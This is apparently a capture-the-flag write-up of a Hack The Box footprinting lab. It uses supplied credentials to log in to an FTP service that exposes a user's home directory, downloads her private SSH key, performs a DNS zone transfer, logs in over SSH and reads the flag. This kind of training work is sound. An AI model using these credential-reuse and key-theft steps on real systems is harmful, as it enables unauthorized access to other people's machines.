<html>
  <head>
    <link rel="icon" href="/assets/imgs/beans.png" type="image/png">
  </head>
  <img src="/assets/imgs/beans.png" alt="Logo" style="position: absolute; top: 0; left: 0; width: 100px; height: auto;">
</html>

[Main Page](/index)

# Footprinting Lab - Easy

---

> Synopsis
"We were commissioned by the company Inlanefreight Ltd to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.
The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.
Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum.
The administrators have stored a flag.txt file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof."

---

So we start with the creds **ceil:qwerty1234**. Let's take a look at the machine and see what we got.

```
Nmap scan report for 10.129.117.172                                         
Host is up (0.14s latency).                                                 

PORT     STATE SERVICE VERSION                                              
21/tcp   open  ftp                    
| fingerprint-strings:                                                      
|   GenericLines:                     
|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.117.172]                                                                                   
|     Invalid command: try being more creative                                                                                                          
|_    Invalid command: try being more creative                                                                                                          
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)                                                                                                   
| dns-nsid:                           
|_  bind.version: 9.16.1-Ubuntu                                             
2121/tcp open  ftp                    
| fingerprint-strings:                                                      
|   GenericLines:                     
|     220 ProFTPD Server (Ceil's FTP) [10.129.117.172]                                                                                                  
|     Invalid command: try being more creative                                                                                                          
|_    Invalid command: try being more creative                                                                                                          
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============                                                                              
SF-Port21-TCP:V=7.80%I=7%D=12/5%Time=6751BEBC%P=x86_64-pc-linux-gnu%r(Gene                                                                              
SF:ricLines,9D,"220\x20ProFTPD\x20Server\x20\(ftp\.int\.inlanefreight\.htb                                                                              
SF:\)\x20\[10\.129\.117\.172\]\r\n500\x20Invalid\x20command:\x20try\x20bei                                                                              
SF:ng\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x2                                                                              
SF:0more\x20creative\r\n");                                                 
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============                                                                              
SF-Port2121-TCP:V=7.80%I=7%D=12/5%Time=6751BEBC%P=x86_64-pc-linux-gnu%r(Ge                                                                              
SF:nericLines,8E,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x20\[10\.1                                                                              
SF:29\.117\.172\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x2                                                                              
SF:0creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea                                                                              
SF:tive\r\n");                        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.26 seconds
```

We have 4 ports open. FTP, SSH, DNS, and then seemingly a second FTP server. The one on port 2121 has a custom banner of `Ceils FTP`.
Let's first try our creds on SSH

```
samr@samr-virtual-machine:~$ ssh ceil@10.129.117.172 -P 2121
ceil@10.129.117.172: Permission denied (publickey).
```

Looks like password authentication is disabled, so we need to have a private key to connect to ssh. However, it looks like we can use `Ceils FTP` on port 2121 with our provided credentials to access the file server.

```
$ ftp ceil@10.129.4.60 2121
Connected to 10.129.4.60.
220 ProFTPD Server (Ceil's FTP) [10.129.4.60]
331 Password required for ceil
Password:
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||3942|)
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp>
```

There seems to be nothing in the files share. However....

```
ftp> ls -la
229 Entering Extended Passive Mode (|||36532|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
ftp>
```

If we use the `ls -la` command to list hidden items, we can see the the ftp servers root directory is the home directory for the Ceil user. This is a big security no no. Since we have access to the home directory, we can read the private key contents in `.ssh`.

```
ftp> cd .ssh
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||63257|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
226 Transfer complete
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||61407|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |***************************************************************************|  3381       59.70 MiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (45.46 KiB/s)
ftp>
```

So we can now login with ssh. But before we do that, I do want to test the dns service as well, as the machine is a dns server.

```
$ dig any inlanefreight.htb @10.129.117.172

; <<>> DiG 9.18.1-1ubuntu1.3-Ubuntu <<>> any inlanefreight.htb @10.129.117.172
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 31786
;; flags: qr aa rd; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: b4610e648a5617eb010000006751c0a4e3ea3e5b7d4b1042 (good)
;; QUESTION SECTION:
;inlanefreight.htb.             IN      ANY

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136

;; Query time: 62 msec
;; SERVER: 10.129.117.172#53(10.129.117.172) (TCP)
;; WHEN: Thu Dec 05 10:03:01 EST 2024
;; MSG SIZE  rcvd: 437
```

Looks like we get a name server. Let's test for zone transfer.

```
$ dig axfr inlanefreight.htb @10.129.117.172

; <<>> DiG 9.18.1-1ubuntu1.3-Ubuntu <<>> axfr inlanefreight.htb @10.129.117.172
;; global options: +cmd
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
internal.inlanefreight.htb. 604800 IN   A       10.129.1.6
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 64 msec
;; SERVER: 10.129.117.172#53(10.129.117.172) (TCP)
;; WHEN: Thu Dec 05 10:06:05 EST 2024
;; XFR size: 10 records (messages 1, bytes 540)
```

And yes, it appears we can perform a zone transfer. We would count this as a finding to the company.
Now let's login as Ceil. First we'll change the permissions on our id_rsa.

`chmod 600 id_rsa`

And login with ssh

```
$ ssh ceil@10.129.117.172 -i id_rsa
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 04 Feb 2025 03:27:30 AM UTC

  System load:  0.0               Processes:               160
  Usage of /:   86.7% of 3.87GB   Users logged in:         0
  Memory usage: 12%               IPv4 address for ens192: 10.129.4.60
  Swap usage:   0%

  => / is using 86.7% of 3.87GB


118 updates can be installed immediately.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
ceil@NIXEASY:~$
```

And boom! We're in! Now to find the flag.txt file. The first thing that grabs my attention in Ceil's home directory is her `.bash_history` file. Let's take a little peak.

```
ls -al
mkdir ssh
cd ssh/
echo "test" > id_rsa
id
ssh-keygen -t rsa -b 4096
cd ..
rm -rf ssh/
ls -al
cd .ssh/
cat id_rsa
ls a-l
ls -al
cat id_rsa.pub >> authorized_keys
cd ..
cd /home
cd ceil/
ls -l
ls -al
mkdir flag
cd flag/
touch flag.txt
vim flag.txt
cat flag.txt
ls -al
mv flag/flag.txt .
```

Looks like she made the flag.txt! It looks like she made a directory called `/home/flag` and placed the flag.txt there.

```
ceil@NIXEASY:~$ cd /home
ceil@NIXEASY:/home$ ls                                                                                                  ceil  cry0l1t3  flag
ceil@NIXEASY:/home$ cd flag
ceil@NIXEASY:/home/flag$ ls                                                                                             
flag.txt
ceil@NIXEASY:/home/flag$ cat flag.txt                                                                                   
HTB{<redacted>}
ceil@NIXEASY:/home/flag$
```

And with that, this box is solved!
